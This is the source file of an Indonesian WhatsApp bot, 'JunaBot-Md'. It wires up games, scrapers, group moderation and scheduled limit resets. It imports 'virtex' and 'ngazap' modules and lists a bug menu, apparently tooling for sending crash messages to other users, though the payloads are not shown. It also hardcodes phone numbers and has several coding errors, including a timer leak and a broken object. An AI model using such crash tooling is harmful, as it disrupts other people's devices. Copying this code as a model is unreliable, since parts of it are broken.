//Sc JunaBot-Md By Junaa Selebew
//jgn lupa enc klo mau di publik/run pake panel, nanti kena curi kang panel😱
//Credit Haruka-Md By Zeeoneofc Recode By Juna
//Base Ori Zeeoneofc

const { 
BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
generateWAMessageFromContent, 
proto, 
generateWAMessageContent, 
generateWAMessage, 
prepareWAMessageMedia, 
downloadContentFromMessage,
areJidsSameUser, 
getContentType,
delay
} = require('@adiwajshing/baileys')

const fs = require('fs')
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const translate = require("@vitalets/google-translate-api");
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const { cuddle } = require('discord-actions')
const axios = require('axios')
const cheerio = require('cheerio')
// const { Doujin } = require('../dist')
// const doujin = new Doujin('https://nhentai.net/g/366327/')
const cookie = require('cookie')
const path = require('path')
const { Configuration, OpenAIApi } = require('openai');
const os = require('os')
const toMS = require("ms");
const ms = require("parse-ms");
const nou = require("node-os-utils");
const kotz = require("kotz-api");
const { PDFDocument, rgb } = require('pdf-lib');
const instagramGetUrl = require("instagram-url-direct");
const gtts = require('node-gtts')
const nhentai = require('nhentai');
const api = new nhentai.API();
const bochil = require("@bochilteam/scraper");
const hxz = require("hxz-api");
const yts = require ("yt-search");
const FormData = require("form-data");
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { sizeFormatter } = require("human-readable");
// const PDFDocument = require('pdfkit');
const similarity = require('similarity')
const threshold = 0.72

let format = sizeFormatter({
std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
decimalPlaces: 2,
keepTrailingZeroes: false,
render: (literal, symbol) => `${literal} ${symbol}B`,
});
var dbs = []
global.dbc = dbs

const _prem = require("./lib/premium");
const _sewa = require("./lib/sewa");
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { addRespons, checkRespons, deleteRespons } = require('./lib/respon');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
const { isSetOpen, addSetOpen, removeSetOpen, changeSetOpen, getTextSetOpen } = require("./lib/setopen");
const { isSetClose, addSetClose, removeSetClose, changeSetClose, getTextSetClose } = require("./lib/setclose");
const { casinoSave, setCasino, deleteCasino } = require("./lib/casino");
const { nikahSave, setNikah, deleteNikah } = require("./lib/nikah");
const msgFilter = require("./lib/antispam");
const { generateProfilePicture, removeEmojis, smsg, tanggal, formatp, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { yta, ytv } = require('./lib/y2mate')
const { goLens } = require("./lib/googlens");
const { topUp } = require("./lib/duniagames");
const { TelegraPh } = require('./lib/uploader')
const { quote } = require('./lib/quote') 
const { pinterest } = require('./lib/scraper')
const { TelegraPH } = require("./lib/TelegraPH")
const { remini } = require('./lib/remini')
const { virtexnya } = require("./bug/virtex")
const { ngazap } = require ('./bug/ngazap')
const { virtex } = require ('./bug/virtex')
const ffstalk = require('./lib/ffstalk')
const mlstalk = require('./lib/mlstalk')
const { color, bgcolor } = require('./lib/color')
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const afk = require("./lib/afk");
const { sticker5 } = require ('./lib/stickerr')

// Database
let setiker = JSON.parse(fs.readFileSync('./database/stik.json'))
let audionye = JSON.parse(fs.readFileSync('./database/vn.json'))
let imagenye = JSON.parse(fs.readFileSync('./database/image.json'))
let videonye = JSON.parse(fs.readFileSync('./database/video.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
let set_open = JSON.parse(fs.readFileSync('./database/set_open.json'));
let set_close = JSON.parse(fs.readFileSync('./database/set_close.json'));
let _afk = JSON.parse(fs.readFileSync('./database/afk.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let opengc = JSON.parse(fs.readFileSync('./database/opengc.json'));
let closegc = JSON.parse(fs.readFileSync('./database/closegc.json'));
let _nsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let mess = JSON.parse(fs.readFileSync('./mess.json'));
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let kickme = JSON.parse(fs.readFileSync('./database/kickme.json'));
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let antilink2 = JSON.parse(fs.readFileSync('./database/antilink2.json'));
let antiwame2 = JSON.parse(fs.readFileSync('./database/antiwame2.json'));
let autodlgc = JSON.parse(fs.readFileSync('./database/autodlgc.json'))
let listCmd = JSON.parse(fs.readFileSync('./database/listcmd.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let modsNumber = JSON.parse(fs.readFileSync('./database/modsNumber.json'));
let responDB = JSON.parse(fs.readFileSync('./database/respon.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let _limit = JSON.parse(fs.readFileSync('./database/user/limit.json'));
let _buruan = JSON.parse(fs.readFileSync('./database/user/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./database/user/darah.json'))
let openaipc = JSON.parse(fs.readFileSync('./database/openaipc.json'))
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
const user_ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const user_nikah = JSON.parse(fs.readFileSync('./database/nikah.json'))
const _petualang = JSON.parse(fs.readFileSync('./database/user/inventory.json'))
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('./database/user/darah.js')
const { cekInventoryAdaAtauGak } = require('./database/user/alat_tukar.js')
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('./database/user/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit } = require('./database/user/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi,kurangGajah, getIkan, getAyam, getKelinci, getDomba,getSapi,getGajah} = require('./database/user/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,addIkan,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addInventori, sellBesi, addDm, sellDm, getDm, sellEmas, addFish, sellFish, getFish, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion,getBesi, getEmas, getEmerald,getUmpan,getPotion} = require('./database/user/rpg.js')

let DarahAwal = 100;
const ikan = ['🐟','🐠','🐡']
const enter = '\n'

// DB Game
let tictactoe = [];
let kuis = []
const kuismath = {}
const _family100 = {}
const tebakgambar = {}
const tebakgame ={}
const tebakkata = {}
const tebakbendera = {}
const siapaaku = {}
const tebakkalimat = {}
const caklontong = {}
const susunkata = {}
const tekateki = {}
const tebakkabupaten = {}
const tebakkimia = {}
const tebaklirik = {}
const gimage1 = {}
const tebaktebakan = {}
const sekarang = new Date();
  // Mengekstrak jam dari waktu saat ini
const jam = sekarang.getHours();

function checkExistingDataInDirectory(directoryPath, targetData) {
    const files = fs.readdirSync(directoryPath);

    for (const file of files) {
        const filePath = path.join(directoryPath, file);
        if (fs.statSync(filePath).isFile() && path.extname(filePath) === '.json') {
            const jsonData = fs.readFileSync(filePath);
            const data = JSON.parse(jsonData);

            for (const group in data) {
                if (data.hasOwnProperty(group)) {
                    const groupData = data[group];
                    if (groupData.yangdilamaar === targetData) {
                        return {
                            status: true,
                            turn: groupData.turn,
                            session: group,
                            Z: groupData.Z,
                            Y: groupData.Y,
                            nominal: groupData.nominal,
                            pelamar: groupData.pelamar,
                            yangdilamaar: groupData.yangdilamaar,
                            filePath: filePath
                        };
                    }
                }
            }
        }
    }
    return { status: false };
}


// if (m.chat)
// try{
// setTimeout(() => { 
//   if (jam === 0) {
//     newRepy('aloooo')
// //   console.log("ALOOOOOO")
// //   newReply("Bot sedang maintenance")
// }
// }, 1000);
// } catch (err) {
// console.error(err)
// }

// chat gpt if
  // Mengambil waktu saat ini
  
  // Cek apakah waktu saat ini adalah pukul 14.00
// if (jam === 4) {
//   console.log("ALOOOOOO")
//   newReply("Bot sedang maintenance")
// }
// setInterval(function() {
// var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
// var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
// if(hasilnes === '04:38:00 AM') {
// juna.sendMessage("120363069927279039@g.us", {text: `Waktu Subuh Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
// }if(hasilnes === '11:55:00 AM') {
// juna.sendMessage("120363069927279039@g.us", {text: `Waktu Dzuhur Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
// }if(hasilnes === '03:14:00 PM') {
// juna.sendMessage("120363069927279039@g.us", {text: `Waktu Ashar Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
// }if(hasilnes === '05:55:00 PM') {
// juna.sendMessage("120363069927279039@g.us", {text: `Waktu Maghrib Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
// }if(hasilnes === '12:33:00 PM') {
// juna.sendMessage("120363179591032307@g.us", {text: `TRIGER TELAH TERDETEKSI PADA PUKUL 12:33:00 `})
// }
// }, 1000);
setInterval(function() { 
var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
var sekarang = new Date();
    // Mengekstrak jam dari waktu saat ini
var jam = sekarang.getHours();
// console.log("Sekarang jam: " + jam);
if(hasilnes === '00:16:00 AM') {
limit = []
fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
glimit = []
fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit))
console.log("Limit Sudah Di Reset!")
}
}, 1000);

// if (jam === 4) {
//     // Set timeout untuk memanggil fungsi yang ingin Anda jalankan selama 1 jam
//   setTimeout(function() {
//       // Kode yang ingin dijalankan selama 1 jam
//       console.log("Kode dijalankan selama 1 jam dari pukul 14.00");
//   }, 0); // Dijalankan segera setelah waktu 14.00
    
//     // Set timeout untuk menghentikan kode setelah 1 jam
//   setTimeout(function() {
//       // Kode untuk menghentikan kode setelah 1 jam
//       console.log("Kode dihentikan setelah 1 jam dari pukul 14.00");
//   }, 3600000); // 3600000 milidetik = 1 jam
//   // return newReply("Aloooo")
// }
// if (jam === 4) {
//   console.log("triger berhasi")
//   if (m.isGroup &&(isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
//     try {
//     newReply("Sedang dilakukan maintenace pada bot selama satu jam\nHarap menunggu")
//     } catch (err) {
//     //console.log(err);
//     newReply("Upss error silahkan hubungi owner agar di fix")
//     //newReply(JSON.stringify(err));
//     }
//     }
//   }
// copy set interval to if jam
// setInterval(function() { 
//   var sekarang = new Date();
//   // Mengekstrak jam dari waktu saat ini
//   var jam = sekarang.getHours();
//   if(jam === 10) {
//     // newReply('Prosess Bosku') 
//     console.log("Limit Sudah Di Reset!")
//   }
//   }, 1000);
//   setInterval(function() { 
//     var sekarang = new Date();
//     // Mengekstrak jam dari waktu saat ini
//     var jam = sekarang.getHours();
//     console.log("Sekarang jam: " + jam);
//     //
//     if(jam === 3) {
//         // newReply('Prosess Bosku') 
//         console.log("Limit Sudah Di Reset!");
//     }
// }, 1000);
// if(jam === 3)
// if (m.isGroup)
// if (jam === 5) {
// console.log("dongo")
// if (m.isGroup &&(isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
//   try {
//   newReply("Sedang dilakukan maintenace pada bot selama satu jam\nHarap menunggu")
//   } catch (err) {
//   //console.log(err);
//   newReply("Upss error silahkan hubungi owner agar di fix")
//   //newReply(JSON.stringify(err));
//   }
//   }

// await m.chat
// await newReply("alooooo")
// newRepy("Sedang dilakukan maintenace pada")


// const juna = {
//   sendMessage: function(jid, message) {
//     console.log(`Sending message to ${jid}: ${message}`);
//     // Logika untuk mengirim pesan
//   }
// }
// var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" })
// var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
// if(hasilnes === '02:07:00 PM') {
//   newReply('Prosess Bosku') 
// }
// 7444
// setInterval(function() { 
// var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
// var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
// if(hasilnes === '02:03:00 PM') {
//   newReply('Prosess Bosku') 
//   limit = []
//   fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
//   glimit = []
//   fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit))
//   console.log("Limit Sudah Di Reset!")
  
//   // function newReply(teks) {
//   //   const nedd = {
//   //     contextInfo: {
//   //       mentionedJid: [m.sender],
//   //       externalAdReply: {
//   //         showAdAttribution: true,
//   //         title: ucapanWaktu,
//   //         body: `${pushname}`,
//   //         previewType: "PHOTO",
//   //         thumbnailUrl: pathimg, 
//   //         sourceUrl: instagram, 
//   //       },
//   //     },
//   //     text: teks,
//   //   };
//   //   return juna.sendMessage(m.chat, nedd, {
//   //     quoted: m,
//   //   });
//   // }
// }
// }, 1000);
// Memanggil fungsi untuk memulai kode triger
// trigerSelama1Jam();

// buka puasa console log
  // if(setting.grupOnly){
  // const jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
  // const hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
  // setInterval(function() { 
  // if(hasilnes === '01:55:00 PM') {
  //   newReply = newReply(teks) {
  //     const nedd = {
  //       contextInfo: {
  //         mentionedJid: [m.sender],
  //         externalAdReply: {
  //           showAdAttribution: true,
  //           title: ucapanWaktu,
  //           body: `${pushname}`,
  //           previewType: "PHOTO",
  //           thumbnailUrl: pathimg, 
  //           sourceUrl: instagram, 
  //         },
  //       },
  //       text: teks,
  //     };
  //     return juna.sendMessage(m.chat, nedd, {
  //       quoted: m,
  //     });
  //   }
  //       // Logika untuk mengirim pesan
  //     }
  //   }
  //   var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" })
  //   var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
  // console.log('berhasil mengirim pesan ke nomor dengan waktu yang sudah ditentukan')
  // Pe = '6285161126317@s.whatsapp.net'
  // //if (args[0].startsWith(`6285600793871`)) return newReply('Ngapain Mau Kirim Ke Owner? Lu Mau Gw Spam?')
  // // newReply('Prosess Bosku') 
  // juna.sendMessage(Pe, {text: `triger terdeteksi pada jam yang telah ditentukan 22`})
  // }
  // }, 1000);
  //chat gpt
//   setInterval(function() { 
//     var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" })
//     var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
//     var Pe = '6285161126317@s.whatsapp.net'
//     // var juna = {
//     //   sendMessage: function(jid, message) {
//     //     console.log(`Sending message to ${jid}`);
//     //     // Logika untuk mengirim pesan
//     //   }
//     // }
//     const juna = {
//       sendStickerFromUrl: async (from, PATH, quoted, options = {}) => {
//         let { writeExif } = require('./lib/sticker')
//         await juna.sendMessage(from, {sticker: {url: pathFile}}, {quoted})
//         return fs.promises.unlink(pathFile)
//       }
//     };
    
//     // Periksa waktu dalam format 24 jam tanpa AM atau PM

//     if (hasilnes === '02:19:30 PM') {
//         let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
//         juna.sendStickerFromUrl(Pe, dino, {packname: `Created By biji` , author: `Owner BIJI` })
//         console.log('berhasil mengirim pesan ke nomor dengan waktu yang sudah ditentukan')
//         //if (args[0].startsWith(`6285600793871`)) return newReply('Ngapain Mau Kirim Ke Owner? Lu Mau Gw Spam?')
//         // newReply('Prosess Bosku') 
//     }
// }, 1000);

  //   setInterval(async () => {
  //   async function(sendMessage(jid))
  //   const jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
  //   const hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna;
  //   if (hasilnes === '11:24:00 AM') {
  //   const Pe = '6285161126317@s.whatsapp.net';
  //   const message = `Trigger detected at specified time.`;
  //   await sendMessage(Pe, message);
  //   console.log('Message sent successfully to the specified number at the specified time.');
  //   }
  // }, 1000);
/**
//  * Constantly checking premium.
//  * @param {Object} _dir 
//  */
//   const jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
//   const hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
//   setInterval(() => {
//       let position = null
//       Object.keys(_dir).forEach((i) => {
//           if (Date.now() >= _dir[i].expired) {
//               position = i
//           }
//       })
//       if (position !== null) {
//           console.log(`Premium expired: ${_dir[position].id}`)
//           let txt = `Premium Expired, Terimakasih Sudah Berlangganan`
//           haruka.sendMessage(_dir[position].id, { text: txt })
//           _dir.splice(position, 1)
//           fs.writeFileSync('./database/premium.json', JSON.stringify(_dir, null, 2))
//       }
//   }, 1000)
// if (jam === 5) {
//   console.log("kntol")
  // if (m.isGroup &&(isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
  //   try {
  //   newReply("Sedang dilakukan maintenace pada bot selama satu jam\nHarap menunggu")
  //   } catch (err) {
  //   //console.log(err);
  //   newReply("Upss error silahkan hubungi owner agar di fix")
  //   //newReply(JSON.stringify(err));
  //   }
  //   }
  // }
// Bandwidth
async function checkBandwidth() {
let ind = 0;
let out = 0;
for (let i of await require("node-os-utils").netstat.stats()) {
ind += parseInt(i.inputBytes);
out += parseInt(i.outputBytes);
}
return {
download: format(ind),
upload: format(out),
};
}

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = juna = async (juna, m, chatUpdate, mek, store, setting, isSetWelcome, getTextSetWelcome, set_welcome_db, set_left_db, isSetLeft, getTextSetLeft, _welcome, _left, antidelete, antionce) => {
try {
const { ownerNumber, instagram, gcwa, ownerName, botName, footer, pathimg, gamewaktu, limitCount } = setting
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
var budy = (typeof m.text == 'string' ? m.text : '')
const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") juna.ev.emit("message.delete", m.message.protocolMessage.key);
const botNumber = await juna.decodeJid(juna.user.id)
const isCreator = [botNumber, ...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDian = '6283870657080@s.whatsapp.net'
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
//const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
// const jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
// const hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const { allMenu, simpleMenu, mainMenu, convertMenu, anonymousMenu, storeMenu, rpgMenu, gameMenu, groupMenu, downloadMenu, searchMenu, updatedMenu,randomMenu, randomAnime, randomQuotes, voiceChanger, cewekMenu, cowokMenu, balanceMenu, ownerMenu, storageMenu, asupanMenu, randomSticker, stalkingMenu, imageEffect, funMenu, islamMenu, bugMenu, nsfwMenu, textproMenu, photooxyMenu, ephotoMenu, logoMenu, donate} = require('./menu') 
let footxt = `${footer}`
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const jam = moment().format("HH:mm:ss z")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)
if (jam === 5) {
  console.log("dkontl")
  // if (m.isGroup &&(isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
  //   try {
  //   newReply("Sedang dilakukan maintenace pada bot selama satu jam\nHarap menunggu")
  //   } catch (err) {
  //   //console.log(err);
  //   newReply("Upss error silahkan hubungi owner agar di fix")
  //   //newReply(JSON.stringify(err));
  //   }
  //   }
  }
// Group
const groupMetadata = m.isGroup ? await juna.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isUser = pendaftar.includes(m.sender)
const isBan = user_ban.includes(m.sender)
const isNikah = user_nikah.includes(m.sender)
const isPetualang = checkPetualangUser(m.sender)
const isPremium = isCreator ? true : _prem.checkPremiumUser(m.sender, premium)
const isSewa = _sewa.checkSewaGroup(m.chat, sewa)
const isKickMe = kickme.includes(m.chat) ? true : false
const isMute= mute.includes(m.chat) ? true : false
const isAntiLink = antilink.includes(m.chat) ? true : false
const isAntiLink2 = antilink2.includes(m.chat) ? true : false
const isAntidelete = antidelete.includes(m.chat) ? true : false
const isAntionce = antionce.includes(m.chat) ? true : false
const isAutoDlGc = autodlgc.includes(m.chat) ? true : false
const isAutoAiGc = openaigc.includes(m.chat) ? true : false
const isAutoAiPc = openaipc.includes(botNumber) ? true : false
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
const isNsfw = _nsfw.includes(m.chat) ? true : false

const isAntiWame = antiwame.includes(m.chat) ? true : false
const isAntiWame2 = antiwame2.includes(m.chat) ? true : false
const gcounti = setting.gcount
const gcount = isPremium ? gcounti.prem : gcounti.user
let timestamp = speed();
let latensi = speed() - timestamp
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `6285600793871-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const fkontaku = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const fbot = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `𝙅𝙪𝙣𝙖𝘽𝙤𝙩-𝙈𝙙`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const isDarah = await cekDuluJoinAdaApaKagaDiJson(m.senpder)
const isCekDarah = await getDarah(m.sender)
const isUmpan = await getUmpan(m.sender)
const isPotion = await getPotion(m.sender)
const isIkan = await getIkan(m.sender)
const isAyam = await getAyam(m.sender)
const isKelinci = await getKelinci(m.sender)
const isDomba = await getDomba(m.sender)
const isSapi = await getSapi(m.sender)
const isGajah = await getGajah(m.sender)
const isMonay = await getMonay(m.sender)
const isBesi = await getBesi(m.sender)
const isEmas = await getEmas(m.sender)
const isEmerald = await getEmerald(m.sender)
const isInventory = await cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = await cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = await cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = await cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
dbs.push({id: m.key.id, m}); 

const ments = (text) => {return text.match('@') ? [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []}
const but1 = (id, text) => [{buttonId: id, buttonText: {displayText: text}, type: 1}]
const but2 = (id1, text1, id2, text2) => [{buttonId: id1, buttonText: {displayText: text1 }, type: 1}, {buttonId: id2, buttonText: {displayText: text2}, type: 1}]
const but3 = (id1, text1, id2, text2, id3, text3) => [{buttonId: id1, buttonText: {displayText: text1}, type: 1}, {buttonId: id2, buttonText: {displayText: text2}, type: 1}, {buttonId: id3, buttonText: {displayText: text3}, type: 1}]
const sendbut = async(id, text, footer, buttons = [], quoted) => {juna.sendMessage(id, {text: text, footer: footer, buttons: buttons, headerType: 2, mentions: ments(text)}, {quoted: quoted})}
const sendbutimg = async(id, caption, footer, image, buttons = [], quoted) => {await juna.sendMessage(id, {image: image, caption: caption, footer: footer, buttons: buttons, headerType: 4, mentions: ments(caption)}, {quoted: quoted})}
const sendbutvid = async(id, caption, footer, video, buttons = [], quoted) => {await juna.sendMessage(id, {video: video, caption: caption, footer: footer, buttons: buttons, headerType: 5, mentions: ments(caption)}, {quoted: quoted})}
const sekarang1 = new Date();
  // Mengekstrak jam dari waktu saat ini
const jam1 = sekarang1.getHours();
setInterval(function() { 
  var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" })
  var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
  var Pe = '6285161126317@s.whatsapp.net'
  // var juna = {
  //   sendMessage: function(jid, message) {
  //     console.log(`Sending message to ${jid}`);
  //     // Logika untuk mengirim pesan
  //   }
  // }
  const juna = {
    sendStickerFromUrl: async (from, PATH, quoted, options = {}) => {
      let { writeExif } = require('./lib/sticker')
      await juna.sendMessage(from, {sticker: {url: pathFile}}, {quoted})
      return fs.promises.unlink(pathFile)
    }
  };
  
  // Periksa waktu dalam format 24 jam tanpa AM atau PM

  if (hasilnes === '02:19:30 PM') {
      let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
      juna.sendStickerFromUrl(Pe, dino, {packname: `Created By biji` , author: `Owner BIJI` })
      console.log('berhasil mengirim pesan ke nomor dengan waktu yang sudah ditentukan')
      //if (args[0].startsWith(`6285600793871`)) return newReply('Ngapain Mau Kirim Ke Owner? Lu Mau Gw Spam?')
      // newReply('Prosess Bosku') 
  }
